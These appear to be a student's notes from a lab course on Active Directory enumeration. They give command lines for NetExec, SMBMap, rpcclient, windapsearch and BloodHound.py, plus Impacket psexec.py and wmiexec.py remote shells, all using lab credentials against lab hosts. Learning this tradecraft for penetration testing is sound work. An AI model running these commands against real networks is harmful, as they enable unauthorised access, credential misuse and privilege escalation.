Now that we have acquired a foothold in the domain, it is time to dig deeper using our low privilege domain user credentials.
**!!!** We will have to have acquired a user's cleartext password, NTLM password hash, or SYSTEM access on a domain-joined host. 

#### NetExec - Domain User Enumeratiom  
```shell
sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --users
```
#### NetExec - Domain Group Enumeration
```shell
sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```
Take note of key groups like `Administrators`, `Domain Admins`, `Executives`, any groups that may contain privileged IT admins, etc. These groups will likely contain users with elevated privileges worth targeting during our assessment.
#### NetExec - Logged On Users
```shell
sudo nxc smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```
**!!** We see that many users are logged into this server which is very interesting. We can also see that our user `forend` is a local admin because `(Pwn3d!)` appears after the tool successfully authenticates to the target host.

--- 
## NetExec Share Searching
#### Share Enumeration - Domain Controller
```shell
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```

#### Spider_plus
```shell
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```
When completed, CME writes the results to a JSON file located at `/tmp/cme_spider_plus/<ip of host>`. We can then dig further to find sensitive files.

## SMBMap
#### SMBMap To Check Access
```shell
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```
#### Recursive List Of All Directories
```shell
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```
*!!* `--dir-only` is used to list only directories.

---
## Rpcclient
[rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) is a handy tool created for use with the Samba protocol and to provide extra functionality via MS-RPC. It can enumerate, add, change, and even remove objects from AD.
Due to SMB NULL sessions (covered in-depth in the password spraying sections) on some of our hosts, we can perform authenticated or unauthenticated enumeration using rpcclient.

```bash
> rpcclient -U "" -N 172.16.5.5

rpcclient>
```
From here, we can begin to enumerate any number of different things. Let's start with domain users.
#### rpcclient Enumeration
While looking at users in rpcclient, you may notice a field called `rid:` beside each user. A [Relative Identifier (RID)](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) is a unique identifier (represented in hexadecimal format) utilized by Windows to track and identify objects.
- The [SID](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) for the INLANEFREIGHT.LOCAL domain is: `S-1-5-21-3842939050-3880317879-2865463114`.
- When an object is created within a domain, the number above (SID) will be combined with a RID to make a unique value used to represent the object.
- So the domain user `htb-student` with a RID:[0x457] Hex 0x457 would = decimal `1111`, will have a full user SID of: `S-1-5-21-3842939050-3880317879-2865463114-1111`.

Accounts like the built-in Administrator for a domain will have a RID [administrator] rid:[0x1f4], which, when converted to a decimal value, equals `500`. The built-in Administrator account will always have the RID value `Hex 0x1f4`, or 500.

#### RPCClient User Enumeration By RID
```shell-session
rpcclient $> queryuser 0x457
```
#### Enumdomusers
```shell-session
rpcclient $> enumdomusers

user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lab_adm] rid:[0x3e9]
user:[htb-student] rid:[0x457]
user:[avazquez] rid:[0x458]
user:[pfalcon] rid:[0x459]
...
```

---
## Impacket Toolkit
#### Psexec.py
The tool creates a remote service by uploading a randomly-named executable to the `ADMIN$` share on the target host. It then registers the service via `RPC` and the `Windows Service Control Manager`. Once established, communication happens over a named pipe, providing an interactive remote shell as `SYSTEM` on the victim host.

**!!** To connect to a host with psexec.py, we need credentials for a user with local administrator privileges.
```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  
```

#### wmiexec.py
This is a more stealthy approach to execution on hosts than other tools, but would still likely be caught by most modern anti-virus and EDR systems.
```bash
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
```
Note that this shell environment is not fully interactive, so each command issued will execute a new cmd.exe from WMI and execute your command.

---
## Windapsearch
[Windapsearch](https://github.com/ropnop/windapsearch) is another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries.
The `--da` (enumerate domain admins group members ) option and the `-PU` ( find privileged users) options. The `-PU` option is interesting because it will perform a recursive search for users with nested group membership.
#### Windapsearch - Domain Admins
```shell
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```
#### Windapsearch - Privileged Users
```shell
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

---
## Bloodhound.py
The tool consists of two parts: the [SharpHound collector](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) written in C# for use on Windows systems, or for this section, the BloodHound.py collector (also referred to as an `ingestor`) and the [BloodHound](https://github.com/BloodHoundAD/BloodHound/releases) GUI tool which allows us to upload collected data in the form of JSON files.
#### BloodHound.py Options
As we can see the tool accepts various collection methods with the `-c` or `--collectionmethod` flag. We can retrieve specific data such as user sessions, users and groups, object properties, ACLS, or select `all` to gather as much data as possible.
#### Executing BloodHound.py
```shell
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
```

#### Upload the Zip File into the BloodHound GUI
We could then type `sudo neo4j start` to start the [neo4j](https://neo4j.com/) service, firing up the database we'll load the data into and also run Cypher queries against.

Next, we can type `bloodhound` from our Linux attack host when logged in using `freerdp` to start the BloodHound GUI application and upload the data.
Now we need to upload the data. We can either upload each JSON file one by one or zip them first with a command such as `zip -r ilfreight_bh.zip *.json` and upload the Zip file.
#### Uploading the Zip File
![[Pasted image 20251103144914.png]]
Now that the data is loaded, we can use the Analysis tab to run queries against the database.
As seen below, we can use the built-in `Path Finding` queries on the `Analysis tab` on the `Left` side of the window.
#### Searching for Relationships
![[Pasted image 20251103165806.png]]

The query chosen to produce the map above was `Find Shortest Paths To Domain Admins`.